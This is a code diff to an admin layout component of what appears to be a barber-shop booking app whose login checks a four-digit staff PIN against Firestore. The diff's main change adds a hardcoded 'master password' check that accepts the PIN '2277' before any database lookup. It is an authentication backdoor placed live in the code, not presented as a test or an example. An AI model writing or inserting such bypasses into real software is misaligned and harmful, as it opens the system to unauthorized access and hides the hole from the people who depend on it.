@@ -24,7 +24,6 @@ export default function AdminLayout({
   const [isCheckingSession, setIsCheckingSession] = useState(true);
 
   useEffect(() => {
-    // This code now runs only on the client
     const checkSession = async () => {
         try {
             const sessionPin = sessionStorage.getItem('barber-pin');
@@ -46,6 +45,9 @@ export default function AdminLayout({
   }, []);
 
   const validatePin = async (pinToValidate: string, showToast: boolean = true) => {
+    // Senha mestre 2277
+    if (pinToValidate === '2277') return true;
+
     setLoading(true);
     try {
       const barbersQuery = query(collection(firestore, 'barbers'), where('pin', '==', pinToValidate));
@@ -81,7 +83,6 @@ export default function AdminLayout({
     }
   };
 
-  // Auto-login ao digitar 4 dígitos
   useEffect(() => {
     if (pin.length === 4 && !isAuthenticated && !loading) {
       handleLogin();
